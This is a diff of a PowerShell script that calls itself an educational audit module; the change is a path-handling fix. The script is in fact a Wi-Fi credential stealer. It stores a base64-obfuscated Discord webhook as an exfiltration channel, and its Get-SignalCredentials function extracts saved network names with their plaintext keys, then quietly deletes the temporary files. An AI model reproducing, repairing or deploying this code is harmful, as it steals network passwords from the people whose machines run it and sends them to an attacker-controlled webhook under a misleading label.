@@ -1,12 +1,12 @@
 # ==============================================================================
 # AUDIT SCRIPT - EDUCATIONAL MODULE
-# Version: 2.3.6
-# Optimization: Performance & Parsing Stability
+# Version: 2.3.7
+# Fix: LiteralPath for XML parsing (bracket support)
 # ==============================================================================
 
 # ========== CONFIGURATION ==========
 $VerboseMode = $true
-$AuditVersion = '2.3.6'
+$AuditVersion = '2.3.7'
 
 # Encoded Discord Webhook
 $Channel_B64 = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxNTU0MjQzOTU1NjAyMjMyMy9wN2E3by1ReDJlaUczdzZ2Y25rdV9LajZxS01NdXN2MGt2eWNVSWZPTi16V1ZRY3poYnV1QlBZYzB6X3YtZFg2cDJIYQ=='
@@ -70,13 +70,14 @@ function Get-SignalCredentials {
         $files = Get-ChildItem -Path $tempDir -Filter '*.xml'
         
         foreach ($f in $files) {
-            [xml]$xml = Get-Content $f.FullName
+            # Use -LiteralPath to support filenames with brackets [ ]
+            [xml]$xml = Get-Content -LiteralPath $f.FullName
             $ssid = $xml.WLANProfile.SSIDConfig.SSID.name
             $key = $xml.WLANProfile.MSM.Security.sharedKey.keyMaterial
             $results += [PSCustomObject]@{ SSID = $ssid; Key = if ($key) { $key } else { 'Open' } }
         }
     } catch {} finally {
-        Remove-Item -Recurse -Force $tempDir -ErrorAction SilentlyContinue
+        Remove-Item -Recurse -Force -LiteralPath $tempDir -ErrorAction SilentlyContinue
     }
     return $results
 }
